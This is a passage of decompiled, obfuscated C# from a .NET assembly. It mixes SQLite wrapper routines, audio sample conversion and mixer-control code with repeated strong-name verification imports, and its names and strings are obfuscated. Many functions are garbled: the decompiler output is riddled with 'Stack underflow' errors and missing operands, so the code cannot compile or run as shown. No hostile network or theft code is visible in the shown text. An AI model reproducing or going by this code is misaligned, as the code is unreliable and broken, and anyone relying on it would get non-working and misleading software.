			//IL_00a7: Expected F4, but got Unknown
			_ = 0.95f;
			float num;
			if (/*Error near IL_000c: Stack underflow*/ >= /*Error near IL_000c: Stack underflow*/)
			{
				if (P_1 < -0.95f)
				{
					num = (0f - (P_1 + 0.95f)) / 0.050000012f;
					return 0f - (float)(global::_0015._0002_0003(num) / 1.5707963705062866 * 0.050000011920928955 + 0.949999988079071);
				}
				return P_1;
			}
			num = (/*Error near IL_0017: Stack underflow*/ - 0.95f) / 0.050000012f;
			return (float)(global::_0015._0002_0003(num) / 1.5707963705062866 * 0.050000011920928955 + 0.949999988079071);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(int _0002, global::_0005._0014 _0003, global::_000F._000F P_2)
		{
			//IL_001c: Incompatible stack heights: 0 vs 2
			//IL_001f: Incompatible stack heights: 0 vs 2
			//IL_0022: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((global::_0005._0014)/*Error near IL_000c: Stack underflow*/)._0001;
			int num = ((global::_0012._0011)/*Error near IL_0015: Stack underflow*/)._0001((int)/*Error near IL_0015: Stack underflow*/, (global::_000F._000F)/*Error near IL_0015: Stack underflow*/);
			/*Error near IL_001a: Stack underflow*/(num);
		}

		static void _0001(global::_0015._0005 P_0)
		{
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			_ = _0082_0003._0013_0007;
			_0080._0014._0001(107379753);
			/*Error near IL_0034: Stack underflow*/((object)/*Error near IL_0034: Stack underflow*/, (string)/*Error near IL_0034: Stack underflow*/);
			_008C_0005._001B_000F(P_0, new Size(96, 16));
		}

		[DllImport("user32.dll", EntryPoint = "DrawIcon")]
		static extern bool _0001(IntPtr _0002, int _0003, int _0004, IntPtr _0005);

		static int _0001(global::_0017._0080 P_0)
		{
			//IL_002b: Incompatible stack heights: 0 vs 1
			if (0 == 0)
			{
				_0018._0001((global::_0017._0080)/*Error near IL_0032: Stack underflow*/);
			}
			int result = -1;
			if (P_0._0001 != null)
			{
				result = P_0._0001.Count;
				P_0._0001.Clear();
			}
			return result;
		}

		static bool _0001(_001A._0018 P_0)
		{
			//IL_0110: Incompatible stack heights: 0 vs 1
			//IL_011a: Incompatible stack heights: 0 vs 1
			_0018._0001((_001A._0018)/*Error near IL_011a: Stack underflow*/);
			switch (/*Error near IL_000f: Stack underflow*/)
			{
			case 0L:
				P_0._0001 = null;
				P_0._0001 = IntPtr.Zero;
				return P_0._0001 = true;
			case 1L:
				P_0._0001 = _0018._0001(P_0);
				P_0._0001 = IntPtr.Zero;
				return P_0._0001 = true;
			case 2L:
				P_0._0001 = _0018._0001(P_0);
				P_0._0001 = IntPtr.Zero;
				return P_0._0001 = true;
			case 3L:
				P_0._0001 = _0018._0001(P_0);
				P_0._0001 = IntPtr.Zero;
				return P_0._0001 = true;
			case 4L:
				P_0._0001 = _0018._0001(P_0);
				P_0._0001 = IntPtr.Zero;
				return P_0._0001 = true;
			case 5L:
				P_0._0001 = DBNull.Value;
				P_0._0001 = IntPtr.Zero;
				return P_0._0001 = true;
			default:
				return false;
			}
		}

		static string _0001(global::_0017._0080 _0002)
		{
			//IL_0068: Incompatible stack heights: 0 vs 1
			//IL_006e: Incompatible stack heights: 0 vs 1
			SQLiteConnectionFlags sQLiteConnectionFlags = (((int)/*Error near IL_0004: Stack underflow*/ != 0) ? ((global::_0017._0080)/*Error near IL_0075: Stack underflow*/).Flags : SQLiteConnectionFlags.None);
			if ((sQLiteConnectionFlags & SQLiteConnectionFlags.NoConvertSettings) == SQLiteConnectionFlags.NoConvertSettings)
			{
				return global::_0001._001A._0002;
			}
			string text = _0080._0014._0001(107379768);
			object obj = null;
			string text2 = null;
			if (_0002 == null || !_0018._0001(_0002, text, (object)text2, ref obj))
			{
				try
				{
					obj = _0018._0001(text, text2);
					if (obj == null)
					{
						obj = global::_0001._001A._0002;
					}
				}
				finally
				{
					if (_0002 != null)
					{
						_0018._0001(_0002, text, obj);
					}
				}
			}
			return _0018._0001(obj);
		}

		static byte[] _0001(global::_0004._0008 _0002, short P_1)
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Incompatible stack heights: 0 vs 4
			//IL_001f: Incompatible stack heights: 0 vs 3
			_ = new byte[2];
			_ = 0;
			_003F val = /*Error near IL_000c: Stack underflow*/>> 8;
			((sbyte[])/*Error near IL_000e: Stack underflow*/)[/*Error near IL_000e: Stack underflow*/] = (sbyte)(byte)val;
			/*Error near IL_000e: Stack underflow*/;
			_ = 1;
			_003F val2 = /*Error near IL_0018: Stack underflow*/& 0xFF;
			((sbyte[])/*Error near IL_001a: Stack underflow*/)[/*Error near IL_001a: Stack underflow*/] = (sbyte)(byte)val2;
			return (byte[])/*Error near IL_001b: Stack underflow*/;
		}

		static long _0001(_001F._0019 _0002, int P_1)
		{
			//IL_008a: Incompatible stack heights: 0 vs 1
			//IL_0090: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_009a: Stack underflow*/, (int)/*Error near IL_009a: Stack underflow*/);
			if (_0002._0001[P_1]._0001 != null)
			{
				return _009C_0005._007E_008E_000F(_0002._0001[P_1]._0001._0001, _0002._0001[P_1]._0004);
			}
			long num = _0002._0001._0001._0002(_0002._0001, _0002._0001[P_1]._0003);
			if (num == 0)
			{
				throw new InvalidCastException();
			}
			return num;
		}

		[DllImport("dsound.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, EntryPoint = "DirectSoundEnumerateA", ExactSpelling = true, SetLastError = true)]
		static extern void _0001(global::_000E._0008._0011 _0002, IntPtr _0003);

		static short _0001(double _0002)
		{
			//IL_000b: Invalid comparison between Unknown and F8
			//IL_0018: Invalid comparison between Unknown and F8
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 1
			if (!((double)/*Error near IL_000d: Stack underflow*/ < -1.0))
			{
				if ((double)/*Error near IL_001a: Stack underflow*/ > 1.0)
				{
					_ = 1.0;
				}
			}
			else
			{
				_ = -1.0;
			}
			_0002 = (double)/*Error near IL_0034: Stack underflow*/;
			return (short)(_0002 * 32767.0);
		}

		static int _0001(byte[] _0002, global::_0017._007F._0006 P_1)
		{
			//IL_00ff: Incompatible stack heights: 0 vs 1
			int num = 0;
			int num2 = ((Array)/*Error near IL_000c: Stack underflow*/).Length;
			int num3 = num2;
			while (true)
			{
				int num4 = _0018._0001(P_1._0001, _0002, num, num2);
				num += num4;
				P_1._0001 += num4;
				num2 -= num4;
				if (num2 == 0 || P_1._0007 == 30)
				{
					break;
				}
				global::_0017._007F._0008 obj = P_1._0001;
				bool flag = (P_1._0007 & 4) != 0;
				bool flag2 = (P_1._0007 & 8) != 0;
				if (_0018._0001(flag2, flag, obj))
				{
					continue;
				}
				if (P_1._0007 == 16)
				{
					return num3 - num2;
				}
				if (P_1._0007 == 20)
				{
					for (int num5 = 8 + (-P_1._0001._0003 & 7); num5 > 0; num5 -= 10)
					{
						_0018._0001(P_1._0001, 2, 10);
					}
					P_1._0007 = 16;
				}
				else if (P_1._0007 == 28)
				{
					_0018._0001(P_1._0001);
					P_1._0007 = 30;
				}
			}
			return num3 - num2;
		}

		static void _0001(global::_0006._0003 _0002, string P_1)
		{
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			_0018._0001((string)/*Error near IL_0022: Stack underflow*/);
			global::_0017._0015 obj = (global::_0017._0015)/*Error near IL_0025: Stack underflow*/;
			_0002._0001 = new global::_0016._0012(obj);
			_0002.ChannelOffset = 0;
		}

		static void _0001(_001A._0018 _0002, global::_0001._007F P_1)
		{
			//IL_003e: Incompatible stack heights: 0 vs 2
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_004c: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((global::_0001._007F)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0045: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				new InvalidOperationException();
				throw /*Error near IL_0018: Stack underflow*/;
			}
			if (_0002 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107388827));
			}
			_0018._0001(P_1._0001, _0002.NativeHandle);
		}

		static object _0001(global::_0012._0013 _0002, string _0003, object[] _0004, string _0005, CommandBehavior _0006)
		{
			//IL_011a: Incompatible stack heights: 0 vs 1
			//IL_0120: Incompatible stack heights: 0 vs 1
			global::_0017._0080 obj = null;
			try
			{
				if ((int)/*Error near IL_000d: Stack underflow*/ == 0)
				{
					_0005 = global::_0010._001C._0001;
				}
				global::_0017._0080 obj2 = (obj = new global::_0017._0080((string)/*Error near IL_001e: Stack underflow*/));
				try
				{
					global::_0008._007E_0016_0002(obj);
					global::_0010._001C obj3 = _0018._0001(obj);
					try
					{
						_0082_0003._007E_0011_0007(obj3, _0003);
						if (_0004 != null)
						{
							foreach (object obj4 in _0004)
							{
								_0016 obj5 = obj4 as _0016;
								if (obj5 == null)
								{
									obj5 = _0018._0001(obj3);
									_0007_0004._007E_0013_0008(obj5, DbType.Object);
									_0004_0006._007E_0097_000F(obj5, obj4);
								}
								obj3.Parameters.Add(obj5);
							}
						}
						switch (_0002)
						{
						case global::_0012._0013._0002:
							return _0018._0001(obj3, _0006);
						case global::_0012._0013._0003:
							return _0018._0001(obj3, _0006);
						case global::_0012._0013._0004:
						{
							bool flag = true;
							try
							{
								return _0018._0001(_0006 | CommandBehavior.CloseConnection, obj3);
							}
							catch
							{
								flag = false;
								throw;
							}
							finally
							{
								if (flag)
								{
									obj._0013 = true;
								}
							}
						}
						case global::_0012._0013._0001:
							break;
						}
					}
					finally
					{
						if (obj3 != null)
						{
							global::_0008._007E_0098(obj3);
						}
					}
				}
				finally
				{
					if (obj2 != null)
					{
						global::_0008._007E_0098(obj2);
					}
				}
			}
			finally
			{
				if (obj != null)
				{
					obj._0013 = false;
				}
			}
			return null;
		}

		static void _0001(byte[] _0002, int _0003, global::_0004._0005 P_2)
		{
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			((global::_0004._0005)/*Error near IL_0025: Stack underflow*/).Length = (int)/*Error near IL_0025: Stack underflow*/;
			_0088_0005._0017_000F(_0002, 0, P_2._0001, _0003);
		}

		static string _0001(Encoding _0002, byte[] _0003, int _0004, int _0005)
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			for (int i = 0; i < _0004; i++)
			{
				_003F val = /*Error near IL_000b: Stack underflow*/+ i;
				if (((byte[])/*Error near IL_000c: Stack underflow*/)[val] == 0)
				{
					_0004 = i;
				}
			}
			return _0084_0002._007E_008D_0005(_0002, _0003, _0005, _0004);
		}

		static DataTable _0001(global::_0017._0080 _0002, string _0003, string P_2)
		{
			//IL_03f5: Incompatible stack heights: 0 vs 1
			//IL_03ff: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107380203);
			new DataTable((string?)/*Error near IL_03ff: Stack underflow*/);
			DataTable dataTable = (DataTable)/*Error near IL_0405: Stack underflow*/;
			_0001_0005._007E_008A_000E(dataTable, _008F_0003._008B_0007());
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362308), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362799), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362814), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107380194), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107380173), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107380188), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358884), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107380139), _0091._0080_0004(typeof(DateTime).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107380154), _0091._0080_0004(typeof(DateTime).TypeHandle));
			global::_0008._007E_0011_0002(dataTable);
			if (global::_001C._0096_0003(_0003))
			{
				_0003 = _0080._0014._0001(107401775);
			}
			string text = ((_009D_0003._009D_0007(_0003, _0080._0014._0001(107401766), StringComparison.OrdinalIgnoreCase) == 0) ? _0080._0014._0001(107362630) : _0080._0014._0001(107362683));
			global::_0010._001C obj = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107357589), new object[2] { _0003, text }), _0002);
			try
			{
				_0014 obj2 = _0018._0001(obj);
				try
				{
					while (global::_001B._007E_008F_0003(obj2))
					{
						if (_009D_0003._009D_0007(_009E_0003._007E_0001_0008(obj2, 1), P_2, StringComparison.OrdinalIgnoreCase) == 0 || global::_001C._0096_0003(P_2))
						{
							string text2 = _008D_0005._007E_001D_000F(_008D_0005._007E_001D_000F(_008D_0005._007E_001D_000F(_009E_0003._007E_0001_0008(obj2, 4), '\r', ' '), '\n', ' '), '\t', ' ');
							int num = _008F_0005._007E_001F_000F(_008E_0005._007E_001E_000F(_008F_0003._008B_0007()), text2, _0080._0014._0001(107357520), CompareOptions.IgnoreCase);
							if (num > -1)
							{
								text2 = global::_0002._007E_000F(_009E_0003._007E_009E_0007(text2, num + 4));
								DataRow dataRow = _0005_0005._007E_008E_000E(dataTable);
								_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362308), _0003);
								_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362814), _009E_0003._007E_0001_0008(obj2, 2));
								_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107380188), false);
								_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107380194), text2);
								_0007_0005._007E_0090_000E(_0006_0005._007E_008F_000E(dataTable), dataRow);
							}
						}
					}
				}
				finally
				{
					if (obj2 != null)
					{
						global::_0008._007E_0098(obj2);
					}
				}
			}
			finally
			{
				if (obj != null)
				{
					global::_0008._007E_0098(obj);
				}
			}
			global::_0008._007E_0013_0002(dataTable);
			global::_0008._007E_0012_0002(dataTable);
			return dataTable;
		}

		static void _0001(int _0002, IntPtr _0003, IntPtr _0004)
		{
			//IL_0012: Incompatible stack heights: 0 vs 2
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			_ = _0091_0006._0086_0010;
			/*Error near IL_0010: Stack underflow*/((IntPtr)/*Error near IL_0010: Stack underflow*/, (int)/*Error near IL_0010: Stack underflow*/, (IntPtr)/*Error near IL_0010: Stack underflow*/);
		}

		static void _0001(_001D._0014 P_0)
		{
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			((_001D._0014)/*Error near IL_0008: Stack underflow*/)._0001 = _001D._0014._0001._0001;
			((_001D._0014)/*Error near IL_0014: Stack underflow*/)._0001 = 0f;
		}

		static long _0001(int _0002, int _0003, _001F._0019 _0004, long _0005, int _0006, char[] P_5)
		{
			//IL_0058: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_0062: Stack underflow*/, (int)/*Error near IL_0062: Stack underflow*/);
			if (_0004._0001[_0002]._0001 != null)
			{
				return _0092_0006._007E_0087_0010(_0004._0001[_0002]._0001._0001, _0004._0001[_0002]._0004, _0005, P_5, _0003, _0006);
			}
			throw new InvalidCastException();
		}

		static DataTable _0001()
		{
			//IL_0144: Incompatible stack heights: 0 vs 1
			//IL_014e: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107380101);
			new DataTable((string?)/*Error near IL_014e: Stack underflow*/);
			DataTable dataTable = (DataTable)/*Error near IL_0154: Stack underflow*/;
			_0001_0005._007E_008A_000E(dataTable, _008F_0003._008B_0007());
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107380112), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107380095), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107380042), _0091._0080_0004(typeof(string).TypeHandle));
			global::_0008._007E_0011_0002(dataTable);
			string[] array = global::_000E._007E_008A_0002(global::_0005._0019.Keywords, new char[1] { ',' });
			foreach (string text in array)
			{
				DataRow dataRow = _0005_0005._007E_008E_000E(dataTable);
				_0093_0006._007E_0088_0010(dataRow, 0, text);
				_0007_0005._007E_0090_000E(_0006_0005._007E_008F_000E(dataTable), dataRow);
			}
			global::_0008._007E_0013_0002(dataTable);
			global::_0008._007E_0012_0002(dataTable);
			return dataTable;
		}

		static void _0001(int _0002, short[] _0003, int _0004, _001A._0005 P_3)
		{
			//IL_018f: Incompatible stack heights: 0 vs 1
			//IL_019b: Incompatible stack heights: 0 vs 2
			if (((_001A._0005)/*Error near IL_000a: Stack underflow*/)._0001._0003 == 16)
			{
				for (int i = 0; i < _0004; i++)
				{
					_ = _008F_0002._007E_0098_0005;
					BinaryWriter binaryWriter = ((_001A._0005)/*Error near IL_002a: Stack underflow*/)._0001;
					short num = _0003[i + _0002];
					/*Error near IL_0034: Stack underflow*/(binaryWriter, num);
				}
				P_3._0003 += _0004 * 2;
			}
			else if (P_3._0001._0003 == 24)
			{
				for (int j = 0; j < _0004; j++)
				{
					byte[] array = _0012_0003._008E_0006(65535 * _0003[j + _0002]);
					P_3._0001[0] = array[1];
					P_3._0001[1] = array[2];
					P_3._0001[2] = array[3];
					_009F_0002._007E_001C_0006(P_3._0001, P_3._0001);
				}
				P_3._0003 += _0004 * 3;
			}
			else if (P_3._0001._0003 == 32 && P_3._0001._0001 == WaveFormatEncoding.Extensible)
			{
				for (int k = 0; k < _0004; k++)
				{
					_009D_0002._007E_0016_0006(P_3._0001, 65535 * _0003[k + _0002]);
				}
				P_3._0003 += _0004 * 4;
			}
			else
			{
				if (P_3._0001._0003 != 32 || P_3._0001._0001 != WaveFormatEncoding.IeeeFloat)
				{
					throw new InvalidOperationException(_0080._0014._0001(107355392));
				}
				for (int l = 0; l < _0004; l++)
				{
					_0094_0006._007E_0089_0010(P_3._0001, (float)_0003[l + _0002] / 32768f);
				}
				P_3._0003 += _0004 * 4;
			}
		}

		static global::_0018._0015 _0001(int _0002)
		{
			//IL_000a: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			_0018._0001((int)/*Error near IL_0011: Stack underflow*/, out global::_0018._0015 _);
			return (global::_0018._0015)/*Error near IL_0009: Stack underflow*/;
		}

		static float[] _0001(_0080._0004 _0002)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0080._0004)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static int _0001(double _0002)
		{
			//IL_000b: Invalid comparison between Unknown and F8
			//IL_0018: Invalid comparison between Unknown and F8
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 1
			if (!((double)/*Error near IL_000d: Stack underflow*/ < -1.0))
			{
				if ((double)/*Error near IL_001a: Stack underflow*/ > 1.0)
				{
					_ = 1.0;
				}
			}
			else
			{
				_ = -1.0;
			}
			_0002 = (double)/*Error near IL_0034: Stack underflow*/;
			return (int)(_0002 * 8388607.0);
		}

		static void _0001(_001E._0010 _0002, BinaryReader P_1)
		{
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			_0018._0001((BinaryReader)/*Error near IL_0047: Stack underflow*/);
			((_001E._0010)/*Error near IL_000b: Stack underflow*/)._0005 = (_001F._0013)/*Error near IL_000b: Stack underflow*/;
			_0002._0003 = global::_001A._007E_001D_0003(P_1);
			for (int i = 0; i < _0002._0003; i++)
			{
				_0083_0002._007E_008C_0005(P_1, 24);
			}
		}

		static void _0001(global::_0017._0080 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0017._0080)/*Error near IL_0007: Stack underflow*/)._0017)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0017._0080).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static bool _0001(MixerControlType _0002)
		{
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_0010: Invalid comparison between Unknown and I4
			//IL_0019: Invalid comparison between Unknown and I4
			//IL_004c: Incompatible stack heights: 0 vs 1
			//IL_004f: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0009: Stack underflow*/ <= 268566529)
			{
				if ((int)/*Error near IL_0012: Stack underflow*/ != 268566528 && (int)/*Error near IL_001b: Stack underflow*/ != 268566529)
				{
					goto IL_0049;
				}
			}
			else
			{
				switch (_0002)
				{
				case MixerControlType.Signed:
				case MixerControlType.Decibels:
				case MixerControlType.Slider:
				case MixerControlType.Pan:
				case MixerControlType.QSoundPan:
					break;
				default:
					goto IL_0049;
				}
			}
			return true;
			IL_0049:
			return false;
		}

		static bool _0001(global::_0017._0080 P_0)
		{
			//IL_006f: Incompatible stack heights: 0 vs 1
			//IL_0075: Incompatible stack heights: 0 vs 1
			bool result = false;
			if ((int)/*Error near IL_0007: Stack underflow*/ != 0)
			{
				if ((((global::_0017._0080)/*Error near IL_000e: Stack underflow*/)._0003 & SQLiteConnectionFlags.NoConnectionPool) == SQLiteConnectionFlags.NoConnectionPool)
				{
					result = false;
				}
				if ((P_0._0003 & SQLiteConnectionFlags.UseConnectionPool) == SQLiteConnectionFlags.UseConnectionPool)
				{
					result = true;
				}
			}
			else
			{
				if ((P_0._0003 & SQLiteConnectionFlags.UseConnectionPool) == SQLiteConnectionFlags.UseConnectionPool)
				{
					result = true;
				}
				if ((P_0._0003 & SQLiteConnectionFlags.NoConnectionPool) == SQLiteConnectionFlags.NoConnectionPool)
				{
					result = false;
				}
			}
			return result;
		}

		static bool _0001(ref int _0002, global::_0013._0017 _0003, ref bool P_2)
		{
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			if (((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				((global::_0013._0017)/*Error near IL_0010: Stack underflow*/)._0001._0003();
				if ((int)/*Error near IL_0014: Stack underflow*/ != 0)
				{
					_0002 = _0003._0001.Changes;
					P_2 = _0003._0001._0002(_0003);
					return true;
				}
			}
			return false;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_blob_write")]
		static extern _0080._0017 _0001(IntPtr _0002, [MarshalAs(UnmanagedType.LPArray)] byte[] _0003, int _0004, int _0005);

		static global::_0017._0080 _0001(global::_0017._0080 P_0)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			_0018._0001((global::_0017._0080)/*Error near IL_001a: Stack underflow*/);
			_ = global::_0008._007E_0016_0002;
			/*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
			return P_0;
		}

		static void _0001(global::_0010._001C P_0)
		{
			//IL_00a5: Incompatible stack heights: 0 vs 1
			//IL_00ab: Incompatible stack heights: 0 vs 2
			//IL_00b5: Incompatible stack heights: 0 vs 1
			if (((global::_0010._001C)/*Error near IL_000a: Stack underflow*/)._0001 != null)
			{
				_ = global::_001B._007E_008C_0003;
				WeakReference weakReference = ((global::_0010._001C)/*Error near IL_001b: Stack underflow*/)._0001;
				/*Error near IL_00b5: Stack underflow*/(weakReference);
				if ((int)/*Error near IL_0022: Stack underflow*/ != 0)
				{
					throw new InvalidOperationException(_0080._0014._0001(107380053));
				}
			}
			if (P_0._0001 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107379996));
			}
			if (_000F_0006._007E_009D_000F(P_0._0001) != ConnectionState.Open)
			{
				throw new InvalidOperationException(_0080._0014._0001(107379395));
			}
			if (P_0._0001._0017 != P_0._0001)
			{
				P_0._0001 = P_0._0001._0017;
				_0018._0001(P_0);
			}
			P_0._0001._0001((global::_0013._0017)null);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0005._0005 _0001(global::_0002._0005 P_0)
		{
			//IL_0064: Incompatible stack heights: 0 vs 2
			//IL_006b: Incompatible stack heights: 0 vs 1
			//IL_006e: Incompatible stack heights: 0 vs 1
			_ = _0094_0002._0004_0006;
			Guid guid = ((global::_0002._0005)/*Error near IL_000c: Stack underflow*/)._0001;
			Guid guid2 = _0001._0008;
			/*Error near IL_006b: Stack underflow*/(guid, guid2);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0 && ((global::_0005._0005)/*Error near IL_001c: Stack underflow*/)._0003 == 32)
			{
				return _0018._0001(((global::_0005._0005)P_0)._0001, (int)((global::_0005._0005)P_0)._0001);
			}
			if (_0094_0002._0004_0006(P_0._0001, _0001._0001))
			{
				return new global::_0005._0005(((global::_0005._0005)P_0)._0001, P_0._0003, ((global::_0005._0005)P_0)._0001);
			}
			return P_0;
		}

		unsafe static string[] _0001(string _0002, char _0003, bool _0004, ref string _0005)
		{
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_0010: Invalid comparison between Unknown and I4
			//IL_0161: Incompatible stack heights: 0 vs 1
			//IL_0167: Incompatible stack heights: 0 vs 1
			//IL_016d: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0009: Stack underflow*/ == 92 || (int)/*Error near IL_0012: Stack underflow*/ == 34)
			{
				string text = _0080._0014._0001(107379366);
				*(string*)(nint)/*Error near IL_0022: Stack underflow*/ = text;
				return null;
			}
			if (_0002 == null)
			{
				_0005 = _0080._0014._0001(107379317);
				return null;
			}
			int num = global::_001A._007E_0016_0003(_0002);
			if (num == 0)
			{
				return new string[0];
			}
			List<string> list = new List<string>();
			StringBuilder stringBuilder = new StringBuilder();
			int num2 = 0;
			bool flag = false;
			bool flag2 = false;
			while (num2 < num)
			{
				char c = _009F_0004._007E_0088_000E(_0002, num2++);
				if (flag)
				{
					if (c != '\\' && c != '"' && c != _0003)
					{
						_009B_0003._007E_009B_0007(stringBuilder, '\\');
					}
					_009B_0003._007E_009B_0007(stringBuilder, c);
					flag = false;
					continue;
				}
				switch (c)
				{
				case '\\':
					flag = true;
					continue;
				case '"':
					if (_0004)
					{
